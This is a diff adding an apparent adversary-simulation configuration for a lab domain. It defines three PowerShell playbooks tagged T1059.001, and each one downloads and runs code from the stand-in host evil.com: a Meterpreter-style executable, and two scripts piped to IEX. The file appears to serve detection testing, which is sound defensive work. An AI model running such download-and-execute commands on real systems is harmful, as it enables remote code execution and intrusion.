@@ -1,0 +1,57 @@
+{
+    "type": "remote",
+    "domain": "attackrange.local",
+	"username": "Administrator",
+    "sleep": 5,
+    "playbooks": [
+      {
+        "name": "PowerShell Adversary Simulation - Using PowerShell to Download and Execute a Malicious Binary",
+        "remote_host": "ar-win-2.attackrange.local",
+        "scout_full_path": "C:\\Windows\\Temp\\Installer.exe",
+        "simulator_relative_path": "AppData\\Local\\Temp\\tmp12345.exe",
+        "enabled": true,
+        "pbsleep": 0,
+        "tasks": [
+          {
+            "technique_id": "T1059.001",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "commandlet": "(New-Object Net.Webclient).DownloadFile('http://www.evil.com/met64.exe', 'C:\\Users\\reed_morse\\AppData\\Roaming\\met64.exe'); Start-Process C:\\Users\\reed_morse\\AppData\\Roaming\\met64.exe",
+            "variation": 1
+          }
+        ]
+      },
+      {
+        "name": "PowerShell Adversary Simulation - Using PowerShell to compile and execute malicious C# code",
+        "remote_host": "ar-win-3.attackrange.local",
+        "scout_full_path": "C:\\Windows\\Temp\\Installer.exe",
+        "simulator_relative_path": "AppData\\Local\\Temp\\tmp12345.exe",
+        "enabled": true,
+        "pbsleep": 0,
+        "tasks": [
+          {
+            "technique_id": "T1059.001",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "commandlet": "(New-Object System.Net.WebClient).DownloadString('http://www.evil.com/benign1.ps1') | IEX",
+            "variation": 1
+          }
+        ]
+      },
+      {
+        "name": "PowerShell Adversary Simulation - Using PowerShell to ",
+        "remote_host": "ar-win-4.attackrange.local",
+        "scout_full_path": "C:\\Windows\\Temp\\Installer.exe",
+        "simulator_relative_path": "AppData\\Local\\Temp\\tmp12345.exe",
+        "enabled": true,
+        "pbsleep": 0,
+        "tasks": [
+          {
+            "technique_id": "T1059.001",
+            "technique_name": "Command and Scripting Interpreter: PowerShell",
+            "commandlet": "(New-Object System.Net.WebClient).DownloadString('http://www.evil.com/benign2.ps1') | IEX",
+            "variation": 1
+          }
+        ]
+      }
+
+    ]
+  }
